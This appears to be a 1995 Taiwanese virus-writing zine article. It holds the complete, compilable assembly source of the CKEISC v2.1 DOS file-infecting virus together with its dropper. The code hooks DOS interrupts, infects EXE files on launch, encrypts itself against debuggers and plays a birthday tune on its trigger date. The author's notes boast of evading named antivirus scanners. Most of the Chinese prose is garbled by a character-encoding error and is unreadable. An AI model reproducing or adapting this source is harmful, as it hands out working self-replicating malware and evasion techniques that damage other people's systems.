
                                                                     P.006

         TpVOtPVoTpvOTpVOtpVoTPvOTPVOtpVOTPvOtPVOtPVOtPvOTPvOTpVoTPVO
         PT                                                        OT
         VP     ¥x ÆW «Â ¤O ¯f ¬r ²Õ Â´   ¯f¬rÂø»x   ²Ä ‘B ´Á      TP
         oV                                                        PV
         TO                  Ææ  CKEISC virus  Ææ                  Vo
         pT                                                        OT
         VP                       by Hero Wu                       VP
         OV                                                        OV
         OVTPVoTpvOtPvoTPVOtPvoTpVotpvoTpVotpvOtPvoTpVOtpvOTPvOTpvOTP


      ³o°¦¯f¬r¥E¨£¤§¤U¦n¹³¨S¦³¤°»ò¡A¹ê»Ú¤W¤]¨S¦³¤°»ò¡A¥i¬O©O´N¬O¥i¥H¸ú¹L
      PVSCAN (§Ú¸Õªº¬O 95 ¦~ 6 ¤ë 16 ¸¹ª©)¡A¦]¬°§Ú¥Îªº¬O«Ü¯S§Oªº¤èªk¡A¥Î
      INT 3 Äd¦b INT21H ªº¶i¤JÂI¤§«e­±¡C¦Ó¥B¶i¤JÂI¨S¦³§ä¡A©Ò¥H´X¥G¬O²ö¦W
      ©_§®´N CALL ¤F¤@­Ó¦a¤è¡A¦]¦¹¦pªG¥i¥H§PÂ_¥X¨Óªº¸Ü¡A¨º¥i´N«Ü®e©ö»~§P
      ¤F¡T¾Ú»¡ PCCILLIN 5.0 ¤]±¾¤F¡A¦]¬°§Ú¨S¦³®³¨ì¡A©Ò¥H¬O§O¤HÀ°§Ú¸Õªº¡A
      §Ú¥u´±»¡¡uÅ¥»¡¡v¡A¦]¬°§Ú¨S¦³¸Õ¹L¡T

      ¦Ó¥B³o°¦¬r¦ü¥G¬O¥þ¥xÆW²Ä¤@°¦¡A¬Æ¦Ü¥þ¥@¬É²Ä¤@°¦¤ä´©­µ®Ä¥dªº¯f¬r¡T¯f
      ¬r¤ä´©­µ®Ä¥d¡S °÷ÅÜºA§a¡T¦Ó¥B¯f¬r½X¤~ 1.8K¡A«Ü¤p§a! ¦b¸Ñ½X³¡¥÷¬O¥Î
      INT 01H¡A¬°ªº¬O·QÅý DEBUG ¥¢®Ä¡A¦Ü©ó¦³¨S¦³¥Î¡A§Ú¤]´N¤£±o¦Óª¾¤F¡T

      §Ú·Q¼g¯f¬r©M¨¾¬rµ{¦¡³Ì¤jªº¤£¦PÂI§Y¦b©ó¡A¼g¬r¤ñ¸û¦Û¥Ñ¡A¥i¥H¤£¥Îª`·N
      ¨ì¬Û®e©Ê°ÝÃD, §Ú¥i¥H¤jÁx¦a§âµ{¦¡½Xª½±µ«þ¨ì HMA ¦Ó¤£­p¦pªG¨S¦³ HMA
      ®É¤§«áªG¡T¦Ó¥B¤]¥i¥Hª½±µ CALL DOS ªº¶i¤JÂI¡A¦Ó¤£ºÞ¬O§_·|·í¾÷¡T¦]¦¹
      §Ú´N¥Î¤F¨Ç¡u¼É¤Oªk¡v¨Ó¸úÁ×´¼¼z«¬¨¾¬rµ{¦¡ªº¤ÀªR¡A³o¤@ÂI¬O­n§i¶D¤j®a
      ¡A¨¾¬rµ{¦¡¦³¨äµo®iªº­­¨î¡A©Ò¥H¦b¬Y¨Ç¤è­±¥i¯à¼g¬rªº¤H·|²¤³Ó¤@Äw¡A§O
      ¾¨«H¨Ç¨¾¬rµ{¦¡¸U¯à¤§»¡¡A¤]§O¥ô·Nµs«þ¥L¤H³nÅé¡T

      ¤j®a¤@©w«Ü¦n©_§a¡A¨s³ºµo§@¨º¤@¤Ñ·|µo¥Í¤°»ò¨Æ©O¡S¨ä¹ê¸ò¥H©¹ªºª©¥»¤]
      ³£®t¤£¦h¡A¥u¤£¹L¬O¦h¤F¡u­µ¼Ö¡v¡A³o­Ó­µ¼Ö©O¡A·íµM¤]¸ò¤å¦r¦³Ãö«Y°Õ¡A
      ´N¬O¥Í¤é§Ö¼Öºq¡T¦Ó¥BÁÙ¬O¦³­µ®Ä¥d¤~Å¥±o¨ì¡A¼Ö¾¹¬°ÄÁÁn¡A¦pªG±z¦b¤»¤ë
      ¤G¤Q¥|¤é¡A¤]´N¬O§Ú¥Í¤é·í¤Ñµo²{¿Ã¹õ¤W¦³¶À¦âªº¦r¦b°{®É¡A§O§Ñ¤F¥´¶}±z
      ªº³â¥z, ²âÅ¥¤@¤U³o¬ü§®ªº­µ¼Ö®@¡T

      ¦b¥»¤å¤å¥½¡A§Ú·Q§â¤@¨Ç§Ú¨S¦³¶Ç¥X¥hªº»¡©úÀÉ¡A¤@°_ªþ¤W¡A¸Ì­±¬O¤@¨Ç§Ú
      ·Q»¡ªº¸Ü¡A¥]¬A§Ú¼g¬rªº²z©Àµ¥¡A¤]³\§A­Ì¬Ý¤F¤§«á¡A·|»{¦P§Ú¼g¬rªº°Ê¾÷
      ¤]»¡¤£©w¡T

                                                 By Dark Smile '95/07/13

;======================= ¥H¤U¬°­ì©l½X¥i¦Û¦æ COMPILER ===================
IO EQU 388H ; ³o¬O­µ®Ä¥dªº IO ADDRESS!
C EQU 0     ; ³o¬O Do ªº index
D EQU 4     ; ³o¬O Re ªº index
E EQU 8     ; ³o¬O Mi ªº index
F EQU 10    ; ³o¬O Fa ªº index
G EQU 14    ; ³o¬O Sol ªº index
A EQU 18    ; ³o¬O La ªº index
B EQU 22    ; ³o¬O Si ªº index
C2 EQU 24   ; ³o¬O°ª­µ Do ªº index
STOP EQU 26 ; ³o¬O¥ð¤î²Åªº  index
TWO EQU 8   ; ³o¥Nªí¤K¤À­µ²Å
FOUR EQU  4 ; ³o¥Nªí¥|¤À­µ²Å
buf_add EQU 09000h  ;  ³o¬O·P¬V®Éªº bufer ¦ì¸m
vir_add EQU 0f000h  ;  ³o¬O¯f¬rªº offset
        .286
        .MODEL  SMALL
        .CODE
start:
Mark    DB      'C'     ;±`¾nMARK
PSP     DW      ?
Tra_T   DW      0
K01_I   DW      ?
K01_C   DW      ?
XORB    DB      3,4,3,4,3,1,2
Rexor   DB      0h
        DB      0a0h    ;·P¬VMARK
INT01A  PROC            ;INT 01H ªº¸Ñ½Xµ{¦¡
        push    bx
        pop     cs:k_bx
        push    sp
        pop     bx
        push    ss:[bx]
        pop     cs:k_ip

        pusha
        int     7       ;³o¤@¦æ¬O¬°¤F·í±¼¬Y°£¿ù³nÅé!
        ;
        cmp     cs:Tra_T,6
        jb      ContA

        mov     ax,ss:[bx+4]    ;¦pªG¸Ñ½X§¹¤F´Nµ²§ô³æ¨B°õ¦æ
        and     ax,1111111011111111b
        mov     ss:[bx+4],ax
 ContA:
        mov     di,cs:Tra_T
        xor     ch,ch
        mov     cl,XORB[di]
        mov     al,cs:Rexor
        add     al,39
        mov     si,cs:k_ip
 CLP:
        xor     ds:[si],al
        inc     si
        loop    CLP
        inc     cs:Tra_T
        popa

        push    cs:k_bx
        pop     bx
        iret
INT01A  ENDP
BEGIN:                          ;¯f¬r¶i¤JÂI
        mov     cs:PSP,es
        mov     WORD PTR cs:Tra_T,0
        cli
        xor     ax,ax
        mov     ds,ax
        mov     bx,OFFSET INT01A              ;Set vect int 01h
        xchg    ds:[4],bx
        mov     cs:K01_I,bx
        mov     ax,cs
        xchg    ds:[6],ax
        mov     cs:K01_C,ax
        push    cs
        pop     ds

        pushf
        pop     bx
        lock    or      bx,0000000100000000b
        push    bx
        popf
        nop
nd_C:
        mov     cx,OFFSET ENDCURE       ;¸Ñ½X
        sub     cx,OFFSET st_C
        mov     si,OFFSET st_C
        mov     al,cs:Rexor
st_LP:
        xor     cs:[si],al
        inc     si
        loop    st_LP
st_C:
        ;
        xor     ax,ax
        mov     ds,ax
        push    cs:K01_I
        pop     ds:[4]
        push    cs:K01_C
        pop     ds:[6]
        ;

        mov     ah,2ah          ;ÀË¬d¬O§_¬°µo§@¤é´Á
        int     21h
        cmp     dh,6
        jne     Not_Today
        cmp     dl,24
        jne     Not_Today
        mov     cs:Date_f,1
        jmp     short Yes_Today
Not_Today:
        mov     cs:Date_f,0
Yes_Today:
        mov     ax,0ffffh       ;ÀË¬d¬O§_±`¾n
        mov     ds,ax
        cmp     BYTE PTR ds:[vir_add],'C'
        jne     Copy_code
        jmp     Installed
Copy_code:
        ;
        cli
        xor     ax,ax
        mov     ds,ax
        ;
        mov     bx,OFFSET INT03+vir_add  ;Set vect int 03h
        mov     ds:[12],bx
        mov     ax,0ffffh
        mov     ds:[14],ax
        ;
        cmp     cs:Date_f,1              ;¦pªG¬°µo§@¤é¦AÄd, ¦]¬°A20¦ì§}½u±`¶}
        jnz     N_TD                     ;Ãö, ©Ò¥H®e©ö·í¾÷, ¥­®É¤£Äd!
        mov     ax,0ffffh
        mov     bx,OFFSET INT08+vir_add  ;Set vect int 08h
        xchg    ds:[32],bx
        mov     cs:Int08_I,bx
        xchg    ds:[34],ax
        mov     cs:Int08_C,ax
 N_TD:
        ;
        push    cs:Int21_C              ;Set & Get vect int 21h!?
        pop     ds
        mov     bx,cs:Int21_I
        mov     BYTE PTR ds:[bx],0cch
        inc     cs:Int21_I
        ;
        push    cs                      ;«þ¨©¦ÜHMA
        pop     ds
        mov     ax,0ffffh
        push    ax
        pop     es
        mov     di,vir_add
        xor     si,si
        mov     cx,OFFSET ENDCURE
rep     movsb
        ;
Installed:
        mov     bx,cs:PSP               ;ªð¦^°õ¦æ­ìEXEÀÉ
        mov     ax,cs:KEEP_cs
        add     ax,bx
        add     ax,010h
        push    ax
        push    cs:KEEP_ip
        mov     ds,bx
        mov     es,bx
        sti
        retf
        ;

 k_ip   DW      0
 k_bx   DW      0
KEEP_SS DW      ?
KEEP_SP DW      ?
KEEP_IP DW      ?
KEEP_CS DW      ?
EXE_HANDLE      DW      ?          ;EXE ÀÉ¤§ÀÉ®×¥N½X.
Int08_I DW      ?
Int08_C DW      ?
Int2a_I DW      ?
Int2a_C DW      ?
Int21_I DW      40F8h              ;³o¬O¤@¯ëDOS¦bHMAªº¶i¤JÂI!
Int21_C DW      0FDC8h
Date_f  DB      00h
Times   DW      0000h
Ckeisc  DW      CkeiscE+vir_add,CkeiscT+vir_add
CkeiscE DB      'CKEISC ver 2.1 CopyLeft(c) 1995 6/5 by Dark Smile '
        DB      'in Taiwan, Taipei at TPVO     Happy birthday to Dark Smile!'
CkeiscT DB      '«Ø¤¤¹q¬ãªÀ¯f¬r2.1ª© ª©Åv¨S¦³ÀH«K§A«þ ¥Á°ê¤K¤Q¥|¦~¤­¤ë¤C¤é '
        DB      '§@ªÌDark Smile ©ó TPVO¯¬ Dark Smile ¥Í¤é§Ö¼Ö ! ^_^ '
LEN_H   DW      ?
LEN_L   DW      ?
CURE_LE DW      ?
BASE1   DW      0200H
BASE2   DW      0010H
cnt     DW      0
times2  DW      0
Ztest   DB      'ZTEST'
Int2aol DB      0cfh

Bir:
        inc     cs:cnt+vir_add
        jmp     Bye
INT08   PROC            ;µo§@µe­±.....^_^
        pusha
        push    es
        push    ds

        cli
        inc     word ptr cs:Times+vir_add
        ;
        cmp     cs:Times+vir_add,1092   ;¤@¤ÀÄÁ§ï¤@¦¸½Õ¦â½L
        jbe     Quit
        mov     cs:Times+vir_add,0
        mov     ax,1012h
        mov     cx,256
        xor     bx,bx
        int     10h
 Quit:
        mov     ax,9100h                ;°»´ú­Ê¤Ñ
        int     10h
        xor     di,di
        cmp     ax,9100h
        je      No_ET
        inc     di
        inc     di
No_ET:
        push    cs
        pop     es
        push    cs
        pop     ds
        mov     ax,1300h
        mov     bx,008eh
        mov     cx,109
        xor     dx,dx
        mov     bp,Ckeisc+vir_add[di]
        int     10h
        ;
        mov     si,cs:times2+vir_add
        shl     si,1
        mov     ax,cs:cnt+vir_add
        cmp     ax,cs:delayt+vir_add[si]
        jbe     Bir

        xor     ax,ax                   ;Ãö±¼­µ®Ä¥d­µ¼Ö
        call    key_off
        mov     cs:cnt+vir_add,0
        xor     ax,ax
        call    s_i                     ;³]©w¼Ö¾¹¬°ÄÁÁn!

        xor     ax,ax                   ;³]©w­µ¶q
        mov     bx,80
        call    set_vol

        xor     ax,ax                   ;©ñ­µ¼Ö
        mov     di,cs:no+vir_add[si]
        mov     cx,4
        call    key_on

        inc     cs:times2+vir_add
        cmp     cs:times2+vir_add,29
        jge     Too_Big
        jmp     short Bye
Too_Big:
        mov     cs:times2+vir_add,0
bye:
        ;
        pop     ds
        pop     es
        popa
        sti
        jmp     DWORD PTR cs:Int08_I+vir_add
INT08   ENDP
no      DW      C,C,D,C,F,E,STOP,C,C,D,C,G,F,STOP,C,C,C2,A,F,E,D
        DW      STOP,C2,C2,A,F,G,F,STOP
delayt  DW      TWO,FOUR,FOUR,TWO,TWO,TWO,TWO,TWO,FOUR,FOUR,TWO,TWO
        DW      TWO,TWO,TWO,FOUR,FOUR,TWO,TWO,TWO,TWO,TWO,TWO,FOUR
        DW      FOUR,TWO,TWO,TWO,TWO
sound   DB      07h,12h,4fh,00h,0f2h,0f2h,60h,72h,00h,00h,08h
notes   DW      155h,16bh,181h,198h,1b0h,1cah,1e5h,202h,220h,241h
        DW      263h,287h,2aeh,0
r_b     PROC
        push    ax
        push    bx
        mov     ax,1
        xor     bx,bx
next:
        call    w_r
        inc     ax
        cmp     ax,245
        jbe     next
        pop     bx
        pop     ax
        ret
r_b     ENDP

w_r     PROC            ;AX register_no,BX data
        push    ax
        push    bx
        push    cx
        push    dx
        mov     dx,IO
        out     dx,al
        mov     cx,6
rept1:
        in      al,dx
        loop    rept1
        inc     dx
        mov     ax,bx
        out     dx,al
        mov     cx,35
rept2:
        in      al,dx
        loop    rept2
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        ret
w_r     ENDP

key_off PROC            ;AX channel_no
        push    ax
        push    bx
        add     ax,0b0h
        xor     bx,bx
        call    w_r
        pop     bx
        pop     ax
        ret
key_off ENDP
key_on  PROC
        pusha
        add     ax,0a0h
        mov     bx,notes+vir_add[di]
        and     bx,0ffh
        call    w_r

        add     ax,10h
        mov     bx,notes+vir_add[di]
        ror     bx,8
        shl     cx,2
        mov     dx,20h
        or      dx,cx
        or      bx,dx
        call    w_r

        popa
        ret
key_on  ENDP
set_vol PROC            ;AX channel BX vol
        add     ax,40h
        call    w_r
        ret
set_vol ENDP
s_i     PROC            ;AX channel_no BP INSTRUMENT *ins
        pusha
        push    ax

        xor     bx,bx
        xor     si,si
        mov     cl,3
        div     cl
        xor     cx,cx
        mov     cl,al
        shl     cx,3
        mov     al,ah
        xor     ah,ah
        add     ax,cx

        mov     cx,4
        add     ax,20h
next_s:
        mov     bl,sound+vir_add[si]
        inc     si
        call    w_r
        add     ax,3
        mov     bl,sound+vir_add[si]
        inc     si
        call    w_r
        add     ax,1dh
        loop    next_s

        add     ax,40h
        mov     bl,sound+vir_add[si]
        inc     si
        call    w_r
        add     ax,3
        mov     bl,sound+vir_add[si]
        inc     si
        call    w_r

        pop     ax
        add     ax,0c0h
        mov     bl,sound+vir_add[si]
        call    w_r
        popa
        ret
s_i     ENDP

INT03   PROC                    ;§Q¥ÎINT 3ÄdINT 21!
        cli
        push    bx
        pop     cs:k_bx+vir_add
        push    sp
        pop     bx
        ;
        push    cs:Int21_I+vir_add
        pop     ss:[bx]
        ;
        mov     bx,cs:k_bx+vir_add
        jmp     short Int21
R_here:
        ;
        mov     bx,cs:k_bx+vir_add
        iret
INT03   ENDP

INT21   PROC            ;¥H¤U¬°INT 21H ¯f¬r·P¬V®Ö¤ß!
        cmp     ax,4b00h
        je      Virus
        jmp     Goodbye
Virus:
;***************************************************Change a EXE file******
        pusha
        push    ds
        push    es
        ;
        push    ds
        pop     es
        push    dx
        pop     di
        mov     al,'.'
        mov     cx,128
repnz   scasb
        cmp     BYTE PTR ds:[di],'E'
        jz      Yes_exe
Not_Infect:
        jmp     Gbye
Yes_exe:
        push    ds

        push    cs
        pop     ds
        sub     di,6
        mov     si,OFFSET Ztest+vir_add         ;­Y¬°ZTEST.EXE«h¤£®h·P¬V
        mov     cx,5
 repz   cmpsb           ;cmpsb ds:si==es:di?

        pop     ds
        cmp     cx,0
        jz      Not_Infect
        ;
        xor     ax,ax                   ;·F±¼INT 2AH!
        mov     es,ax
        mov     ax,es:[168]
        mov     cs:Int2a_I+vir_add,ax
        mov     ax,es:[170]
        mov     cs:Int2a_C+vir_add,ax
        ;
        mov     bx,cs:Int2a_C+vir_add
        mov     es,bx
        mov     bx,cs:Int2a_I+vir_add
        mov     al,es:[bx]
        mov     cs:Int2aol+vir_add,al
        mov     BYTE PTR es:[bx],0cfh
        ;
        mov     ax,3D00h                ;Open EXE file
        pushf
        call    DWORD PTR cs:Int21_I+vir_add
        mov     cs:EXE_HANDLE+vir_add,ax
        mov     bx,ax
        ;
        push    bx                      ; save BX
        mov     ax,1220h
        int     2fh                     ; get JFT
        mov     ax,1216h
        xor     bh,bh
        mov     bl,es:[di]              ; BL=JFT
        int     2fh                     ; get SFT
        pop     bx                      ; restore BX

        mov     word ptr es:[di+2],2    ; file mode = 2 (read/write)

        mov     al,es:[di+4]            ; AL=file attribute
        push    ax                      ; save AX
        mov     byte ptr es:[di+4],0    ; set file attribute to zero
        ;
        mov     ax,es:[di+11h]  ; AX=file length
        mov     dx,es:[di+13h]
        dec     ax
        mov     es:[di+15h],ax  ; set access point to file end
        mov     es:[di+17h],dx  ; set access point to file end
        push    es
        push    di
        ;
        mov     ax,buf_add
        mov     es,ax
        mov     ax,buf_add
        mov     ds,ax
        ;
        mov     ah,3FH
        mov     dx,OFFSET EXE_BUF+vir_add
        mov     cx,1
        pushf
        call    DWORD PTR cs:Int21_I+vir_add
        cmp     byte ptr es:EXE_BUF+vir_add,0a0h          ;If Virus file?
        jne     Dvir
        jmp     Goodvir
        ;
Dvir:
        push    cs                      ;Copy code
        pop     ds
        mov     di,vir_add
        mov     si,di
        mov     cx,OFFSET ENDCURE
rep     movsb
        dec     es:Int21_I+vir_add
        mov     ax,buf_add
        mov     ds,ax
        ;
        mov     bx,cs:EXE_HANDLE+vir_add                ;Seek to file head
        xor     cx,cx                  ; ÀÉ®×«ü¼Ð²¾¨ìÀÉÀY
        xor     dx,dx
        mov     ax,4200H
        pushf
        call    DWORD PTR cs:Int21_I+vir_add
        ;
        mov     bx,cs:EXE_HANDLE+vir_add
        mov     ah,3FH
        mov     dx,OFFSET EXE_BUF+vir_add
        mov     cx,020H
        pushf
        call    DWORD PTR cs:Int21_I+vir_add
        ;                              ;«O¦s­ì©l SS,SP,IP,cs
        mov     ax,WORD PTR es:EXE_BUF[00EH+vir_add]
        mov     es:KEEP_SS+vir_add,ax
        mov     ax,WORD PTR es:EXE_BUF[010H+vir_add]
        mov     es:KEEP_SP+vir_add,ax
        mov     ax,WORD PTR es:EXE_BUF[014H+vir_add]
        mov     es:KEEP_IP+vir_add,ax
        mov     ax,WORD PTR es:EXE_BUF[016H+vir_add]
        mov     es:KEEP_cs+vir_add,ax
        ;
        xor     cx,cx                  ; ÀÉ®×«ü¼Ð²¾¨ìÀÉ§À
        xor     dx,dx
        mov     ax,4202H
        pushf
        call    DWORD PTR cs:Int21_I+vir_add
        ;
        add     ax,0fh
        adc     dx,00h
        and     ax,0fff0h
        mov     es:LEN_H+vir_add,dx
        mov     es:LEN_L+vir_add,ax
        ;
        mov     ax,OFFSET ENDCURE
        mov     bh,010H
        div     bh
        xor     ah,ah
        inc     ax
        push    ax
        xor     dx,dx
        mul     cs:BASE2+vir_add
        mov     cs:CURE_LE+vir_add,ax              ;­pºâ¯f¬rªø«×.
        add     ax,es:LEN_L+vir_add
        adc     dx,es:LEN_H+vir_add
        div     es:BASE1+vir_add                      ;­pºâ( EXE + ¯f¬r) ªø«×.
        or      dx,dx
        jz      TAIL1
        inc     ax
TAIL1:
        mov     WORD PTR es:EXE_BUF[04H+vir_add],ax ;¼g¦Ü EXE_BUF.
        mov     WORD PTR es:EXE_BUF[02H+vir_add],dx
        ;                              ;­pºâ·sªº cs.
        mov     ax,es:LEN_L+vir_add
        mov     dx,es:LEN_H+vir_add
        div     es:BASE2+vir_add
        sub     ax,WORD PTR es:EXE_BUF[08H+vir_add]
        mov     WORD PTR es:EXE_BUF[016H+vir_add],ax
        pop     bx
        add     ax,bx                      ;­pºâ·sªº SS.
        mov     WORD PTR es:EXE_BUF[00EH+vir_add],ax
        mov     WORD PTR es:EXE_BUF[014H+vir_add],OFFSET BEGIN
        ;
        mov     bx,cs:EXE_HANDLE+vir_add            ;ÀÉ®×«ü¼Ð²¾¦ÜÀÉÀY
        mov     ax,4200H
        xor     cx,cx
        xor     dx,dx
        pushf
        call    DWORD PTR cs:Int21_I+vir_add
        ;
        mov     ah,40H
        mov     dx,OFFSET es:EXE_BUF+vir_add
        mov     cx,020H
        pushf
        call    DWORD PTR cs:Int21_I+vir_add
        ;
        mov     cx,es:LEN_H+vir_add
        mov     dx,es:LEN_L+vir_add
        mov     ax,4200H
        pushf
        call    DWORD PTR cs:Int21_I+vir_add
        ;
        add     es:Rexor+vir_add,19
        add     cs:Rexor+vir_add,19
        mov     cx,OFFSET ENDCURE+vir_add
        mov     si,OFFSET st_C+vir_add
        sub     cx,si
        mov     al,es:Rexor+vir_add
st_LPP:
        xor     es:[si],al
        inc     si
        loop    st_LPP

        add     al,39
        mov     cx,OFFSET st_C+vir_add
        mov     si,OFFSET nd_C+vir_add
        sub     cx,si
st_LPP1:
        xor     es:[si],al
        inc     si
        loop    st_LPP1
        ;                              ;¼g¤J¯f¬r.
        mov     ax,buf_add
        mov     ds,ax
        mov     bx,cs:EXE_HANDLE+vir_add
        mov     cx,cs:CURE_LE+vir_add
        dec     cx
        mov     dx,vir_add
        mov     ah,040H
        pushf
        call    DWORD PTR cs:Int21_I+vir_add
        ;
        mov     dx,OFFSET Rexor+vir_add+1
        mov     cx,1
        mov     ah,40H
        pushf
        call    DWORD PTR cs:Int21_I+vir_add
        ;
Goodvir:
        ;
        pop     di
        pop     es
        mov     ax,es:[di+11h]  ; AX=file length
        mov     dx,es:[di+13h]
        mov     es:[di+15h],ax  ; set access point to file end
        mov     es:[di+17h],dx  ; set access point to file end
        ;
        pop     ax              ; AX=file attribute
        mov     es:[di+4],al    ; restore file attribute

        or      word ptr es:[di+5],0100000000000000b
                                ; ÃöÀÉ®É¤£­n§ïÅÜ®É¶¡©M¤é´Á
        ;
        mov     ah,3EH
        pushf
        call    DWORD PTR cs:Int21_I+vir_add
        ;
        mov     bx,cs:Int2a_C+vir_add
        mov     es,bx
        mov     bx,cs:Int2a_I+vir_add
        mov     al,cs:Int2aol+vir_add
        mov     es:[bx],al
        ;
Gbye:
        pop     es
        pop     ds
        popa
;**********************************************************************
Goodbye:
        jmp     R_here
INT21   ENDP
CURE_B  DB      0a0h
EXE_BUF:
ENDCURE:
;¥H¤U¬°¸m¬r¾¹³¡¥÷, §Ú´N¤£¦h»¡¤F, ¤Ï¥¿¤£¬O­«ÂI!
init    PROC
        ;
        mov     ah,62h                     ;¦Ü PSP:082H ¨ú±o
        int     21H                        ;°Ñ¼Æ¸ô®|.
        mov     ds,bx
        mov     si,082h
        push    cs
        pop     es
        mov     DI,OFFSET PATH
        cld
L1:
        CMP     BYTE PTR ds:[SI],0dh
        je      L2
        movsb
        jmp     L1
L2:
        xor     al,al                      ;³y¦¨ASCIIZ¦r¦ê
        mov     es:[DI],al
        ;
        push    cs                   ;¶}±ÒÀÉ®×.
        pop     ds
        mov     dx,OFFSET PATH
        mov     ax,3D02H
        pushf
        call DWORD PTR cs:I21IC
        mov     cs:EXE_HANDLE,ax
        ;
        mov     bx,cs:EXE_HANDLE
        xor     cx,cx                  ; ÀÉ®×«ü¼Ð²¾¨ìÀÉÀY
        xor     dx,dx
        mov     ax,4200H
        pushf
        call DWORD PTR cs:I21IC
        ;
        mov     bx,cs:EXE_HANDLE               ;Åª¨úÀÉÀY 32 ­Ó BYTES.
        mov     ah,3FH
        mov     dx,OFFSET cs:EXE_BUF
        mov     cx,020H
        pushf
        call DWORD PTR cs:I21IC
        ;                              ;«O¦s­ì©l SS,SP,IP,cs
        mov     ax,WORD PTR cs:EXE_BUF[00EH]
        mov     cs:KEEP_SS,ax
        mov     ax,WORD PTR cs:EXE_BUF[010H]
        mov     cs:KEEP_SP,ax
        mov     ax,WORD PTR cs:EXE_BUF[014H]
        mov     cs:KEEP_IP,ax
        mov     ax,WORD PTR cs:EXE_BUF[016H]
        mov     cs:KEEP_cs,ax
        ;
        mov     bx,cs:EXE_HANDLE
        xor     cx,cx                  ; ÀÉ®×«ü¼Ð²¾¨ìÀÉ§À
        xor     dx,dx
        mov     ax,4202H
        pushf
        call DWORD PTR cs:I21IC
        ;
        add     ax,0fh
        adc     dx,00h
        and     ax,0fff0h
        mov     cs:LEN_H,dx
        mov     cs:LEN_L,ax
        ;
        mov     ax,OFFSET ENDCURE
        mov     bh,010H
        div     bh
        xor     ah,ah
        inc     ax
        push    ax
        xor     dx,dx
        mul     cs:BASE2
        mov     cs:CURE_LE,ax              ;­pºâ¯f¬rªø«×.
        add     ax,cs:LEN_L
        adc     dx,cs:LEN_H
        div     cs:BASE1                      ;­pºâ( EXE + ¯f¬r) ªø«×.
        or      dx,dx
        jz      TAIL
        inc     ax
TAIL:
        mov     WORD PTR cs:EXE_BUF[04H],ax ;¼g¦Ü EXE_BUF.
        mov     WORD PTR cs:EXE_BUF[02H],dx
        ;                              ;­pºâ·sªº cs.
        mov     ax,cs:LEN_L
        mov     dx,cs:LEN_H
        div     cs:BASE2
        sub     ax,WORD PTR cs:EXE_BUF[08H]
        mov     WORD PTR cs:EXE_BUF[016H],ax
        pop     bx
        add     ax,bx                      ;­pºâ·sªº SS.
        inc     ax
        mov     WORD PTR cs:EXE_BUF[00EH],ax
        mov     WORD PTR cs:EXE_BUF[014H],OFFSET BEGIN
        ;
        mov     bx,cs:EXE_HANDLE            ;ÀÉ®×«ü¼Ð²¾¦ÜÀÉÀY
        mov     ax,4200H
        xor     cx,cx
        xor     dx,dx
        pushf
        call DWORD PTR cs:I21IC
        ;
        mov     ah,40H
        mov     bx,cs:EXE_HANDLE
        mov     dx,OFFSET cs:EXE_BUF
        mov     cx,020H
        pushf
        call DWORD PTR cs:I21IC
        ;
        mov     bx,cs:EXE_HANDLE               ;²¾°Ê«ü¼Ð¦ÜEXEÀÉ¤§«á.
        mov     cx,cs:LEN_H
        mov     dx,cs:LEN_L
        mov     ax,4200H
        pushf
        call DWORD PTR cs:I21IC
        ;
        mov     al,39
        mov     cx,OFFSET st_C
        mov     si,OFFSET nd_C
        sub     cx,si
st_LPP2:
        xor     cs:[si],al
        inc     si
        loop    st_LPP2
        ;                              ;¼g¤J¯f¬r.
        mov     bx,cs:EXE_HANDLE
        mov     cx,cs:CURE_LE
        dec     cx
        dec     cx
        mov     dx,OFFSET start
        mov     ah,040H
        pushf
        call DWORD PTR cs:I21IC
        ;
        mov     dx,OFFSET Rexor
        mov     bx,cs:EXE_HANDLE               ;­×§ïªø«×.
        mov     cx,2
        mov     ah,40H
        pushf
        call DWORD PTR cs:I21IC
        ;
        mov     bx,cs:EXE_HANDLE
        mov     ah,3EH
        pushf
        call DWORD PTR cs:I21IC
        ;
        mov     ah,4ch
        int     21H
init    ENDP
I21IC   DW      40f8h
        DW      0fdc8h
PATH    DB     62     DUP(0)
        END    init
;=========================================================================

     CKEISC v2.1

     ¨þ¨þ... ¬Ý¼Ë¤l§r 1.8 ª©ÁÙ¬O¨S¦³¶Ç¥X¥h¡A³o¦¸ªº­ì¦]§Ú´N¤£ª¾¹D¤F¡A¤]³\¬O
     §ÚÃi±o¶Ç§a¡A¤]³\¬O§Ú¤¯·O¡A¤Ï¥¿µ²ªG´N¬O¨S¦³¶Ç¥X¥h¡C²{¦b 2.1 ª©·s¼W¥\¯à
     ´N¬O¨¾¤î³Q ZLOCK §ä¨ì¡AÁöµM¤£¬O§¹¥þ¡A¦ý¬O³q±`³£¥i¥H¸ú¹L¡A¦Ü©ó¬°¤°»ò¦p
     ¦¹¡A¨º´N±o¥h°Ý ZLOCK ªº§@ªÌ°Õ¡A¨º¬O¥L¼gªºµ{¦¡¡A§Ú«ç»ò·|ª¾¹D¡TPVSCAN
     1.9J ¦ü¥G±½¤£¨ì¡A¦Ü©ó·s¥Xªº PCCILLIN 5.0 ªº¸ÜÀ³¸Ó¬O·|³Q§ì¨ì·P¬V°Ê§@°Õ
     ¡A¦pªG¨S¦³¡A¨º´Nºâ¤F¡A¤£¯à©Ç§Ú¡A­n©Ç¼g PCCILLIN ªº¤H°Õ¡A¤£¹L§Ú·Q¥Lªº
     ¤H¤u´¼¼z¥i¯à·|±½¤£¨ì­Ë¬O¯uªº¡A¦]¬° PVSCAN ¤]§ä¤£¨ì¡T

     ¤£ºÞ¨º»ò¦h°Õ¡T¤Ï¥¿´N§O¶Ã«þªFªF´N¤ñ¸û¤£·|¦³¨Æ°Õ¡T¤p¤ß¡T¯f¬r´N¦b§A¨­Ãä!

     Ä@­ìª©³nÅéªº·R¥ÎªÌµL¬r¤£«I¡AµL¬r¤£§J¡T½Ð¤ä«ù­ìª©³nÅé§a¡T^_^

                                                  By Dark Smile 1995/06/28

     CKEISC v1.8

     ¨þ¨þ... ¬Ý¨Ó 1.6 ª©ÁÙ¬O¨S¦³¶Ç¥X¥h¡A¦]¬°¦b³o¤§¤¤ªº®É¶¡¡A§Ú¥h¤F®v¤j¤@½ë
     ¡A©Ò¥H¤]´N¨S¦³®É¶¡¥h¶Ç°Õ¡T¤£¹L¡A¨S¶Ç¥X¥h¤]´Nºâ¤F¡A¦]¬°§Ú¦b¤@­Ó¤ë¥H«á
     ¤S§ä¨ì¤F¤@­Ó«Ü¤jªº¡u Bug ¡v¡A¦Ó¥B¤S¥[¤J¤F¡u¤ä´©­µ®Ä¥d¡vªº¥\¯à¡A¦b§Ú¥Í
